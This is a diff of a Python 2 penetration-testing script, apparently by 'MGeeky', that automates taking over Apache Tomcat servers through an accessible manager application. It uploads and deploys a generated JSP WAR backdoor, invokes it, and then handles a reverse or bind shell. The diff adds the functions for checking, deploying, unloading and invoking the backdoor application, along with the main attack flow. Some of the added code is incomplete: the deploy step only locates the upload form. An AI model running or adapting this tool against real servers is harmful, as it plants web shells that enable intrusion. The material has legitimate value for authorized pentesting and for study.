@@ -1,5 +1,24 @@
 #!/usr/bin/python
 
+#
+# Apache Tomcat server misconfiguration penetration testing tool.
+#   What this tool does is to locate Tomcat server, validate access
+#   to it's manager application (web) and then leverage this access
+#   in order to upload there an automatically generated WAR application.
+#   After having the application uploaded and deployed, script invokes it
+#   and then if configured so - handles incoming shell connection (reverse tcp)
+#   or connects back to binded connection.
+#
+# In other words - automatic Tomcat WAR deployment pwning tool.
+#
+#
+# Currently tested on:
+#  Apache Tomcat/7.0.52 (Ubuntu)
+#
+# Mariusz B. / MGeeky, '16
+#
+
+
 import mechanize
 import os
 import urllib2
@@ -11,6 +30,7 @@ import tempfile
 import shutil
 import re
 import base64
+from BeautifulSoup import BeautifulSoup
 import logging
 import commands
 
@@ -21,7 +41,6 @@ logger = logging.getLogger()
 
 
 def generateWAR(code, title, appname):
-    warpath = ''
     dirpath = tempfile.mkdtemp()
 
     logging.info('Generating temporary structure for %s WAR at: "%s"' % (appname, dirpath))
@@ -67,7 +86,7 @@ Created-By: %s
 
     print packing[1]
 
-    return (dirpath, warpath)
+    return (dirpath, outpath)
 
 def preparePayload(opts):
     logging.info('Generating JSP WAR backdoor code...')
@@ -133,6 +152,61 @@ def preparePayload(opts):
 
     return payload
 
+def invokeApplication(browser, url, appname):
+    appurl = 'http://%s/%s/' % (url, appname)
+    logging.info('Invoking application at url: "%s"' % appurl)
+
+    try:
+        resp = browser.open(appurl)
+        print '-' * 40
+        print resp.read()
+        print '-' * 40
+
+        return True
+
+    except urllib2.HTTPError, e:
+        if e.code == 404:
+            logging.error('Application "%s" does not exist, or was not deployed.' % appname)
+        else:
+            logging.error('Failed with error: %d, msg: "%s"' % (int(e.code), str(e)))
+
+    return False
+
+def deployApplication(browser, url, appname, warpath):
+
+    logging.info('Deploying application: %s from file: "%s"' % (appname, warpath))
+    resp = browser.open(url)
+    for form in browser.forms():
+        if url in form.action and '/upload?' in form.action:
+            print 'OK: ' + form.action
+
+            return True
+
+    return False
+
+def checkIsDeployed(browser, url, appname):
+    for form in browser.forms():
+        if url in form.action and '/undeploy?path=/'+appname+'&' in form.action:
+            return True
+
+    return False
+
+def unloadApplication(browser, url, appname):
+    appurl = 'http://%s/%s/' % (url, appname)
+    logging.info('Unloading application: "%s"' % appurl)
+    for form in browser.forms():
+        if url in form.action and '/undeploy?path=/'+appname+'&' in form.action:
+            resp = form.submit()
+            content = resp.read()
+
+            try:
+                resp = browser.open(appurl)
+            except HTTPError, e:
+                if e.code == 404:
+                    return True
+
+    return False
+
 def validateManagerApplication(browser):
     found = 0
     actions = ('stop', 'start', 'deploy', 'undeploy', 'upload', 'expire', 'reload')
@@ -142,7 +216,6 @@ def validateManagerApplication(browser):
                 found += 1
 
     return (found >= len(actions))
-
 
 def browseToManager(url, user, password):
     logger.info('Browsing to "%s"... Creds: %s:%s' % (url, user, password))
@@ -202,6 +275,7 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
     parser.add_option('-X', '--shellpass', metavar='PASSWORD', dest='shellpass', help='Specifies authentication password for uploaded shell, to prevent unauthenticated usage. Default: randomly generated. Specify "None" to leave the shell unauthenticated.', default=generateRandomPassword())
     parser.add_option('-t', '--title', metavar='TITLE', dest='title', help='Specifies head>title for uploaded JSP WAR payload. Default: "JSP Application"', default='JSP Application')
     parser.add_option('-n', '--name', metavar='APPNAME', dest='appname', help='Specifies JSP application name. Default: "jsp_app"', default='jsp_app')
+    parser.add_option('-x', '--unload', dest='unload', help='Unload existing JSP Application with the same name. Default: no.', action='store_true')
     parser.add_option('-f', '--file', metavar='WARFILE', dest='file', help='Custom WAR file to deploy. By default the script will generate own WAR file on-the-fly.')
 
     opts, args = parser.parse_args()
@@ -239,15 +313,35 @@ def main():
     if browser == None:
         return
 
-
-    code = preparePayload(opts)
-
     try:
         if not opts.file:
+            code = preparePayload(opts)
             (dirpath, warpath) = generateWAR(code, opts.title, opts.appname)
         else:
             warpath = opts.file
 
+        if checkIsDeployed(browser, url, opts.appname):
+            logging.info('Application with name: "%s" is already deployed.' % opts.appname)
+            if opts.unload:
+                logging.info('Unloading existing one...')
+                if unloadApplication(browser, args[0], opts.appname):
+                    logging.info('Succeeded.')
+                else:
+                    logging.info('Unloading failed.')
+                    return
+            else:
+                logging.error('Not continuing until the application name is changed or current one unloaded.')
+                logging.error('Please use -u (--unload) option to force current application unloading.')
+                return
+        else:
+            logging.info('It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)
+
+        if deployApplication(browser, url, opts.appname, warpath):
+            logging.info('Succeeded, invoking it...')
+            invokeApplication(browser, args[0], opts.appname)
+
+        else:
+            logging.error('Failed.')
 
     except KeyboardInterrupt:
         print '\nUser interruption.'
